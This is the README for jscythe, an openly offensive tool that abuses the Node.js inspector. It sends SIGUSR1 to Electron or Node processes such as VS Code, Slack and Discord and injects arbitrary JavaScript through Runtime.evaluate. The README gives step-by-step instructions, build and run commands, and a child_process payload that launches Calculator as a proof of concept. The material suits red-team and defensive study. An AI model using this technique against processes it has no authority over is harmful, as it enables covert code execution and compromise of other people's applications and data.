jscythe abuses the node.js [inspector mechanism](https://nodejs.org/en/docs/guides/debugging-getting-started/) in order to force any node.js/electron/v8 based process to execute arbitrary javascript code, even if their debugging capabilities are disabled.

![vscode](https://i.imgur.com/MmUupgZ.jpg)

Tested and working against Visual Studio Code, Slack, Discord, any Node.js application and more!

## How

1. Locate the target process.
2. Send `SIGUSR1` signal to the process, this will enable the debugger on a port (depending on the software, sometimes it's random, sometimes it's not).
3. Determine debugging port by diffing open ports before and after sending `SIGUSR1`.
4. Get the websocket debugging URL and session id from `http://localhost:<port>/json`.
5. Send a `Runtime.evaluate` request with the provided code.
6. Profit.

## Building

```sh
cargo build --release
```

## Running 

Target a specific process and execute a basic expression:

```sh
./target/debug/jscythe --pid 666 --code "5 - 3 + 2"
```

Execute code from a file:

```sh
./target/debug/jscythe --pid 666 --script example_script.js
```

The `example_script.js` can require any node module and execute any code, like:

```js
require('child_process').spawnSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator', { encoding : 'utf8' }).stdout
```

Search process by expression:

```sh
./target/debug/jscythe --search extensionHost --script example_script.js
```

## Other options

Run `jscythe --help` for the complete list of options. 

## License

This project is made with ♥  by [@evilsocket](https://twitter.com/evilsocket) and it is released under the GPL3 license.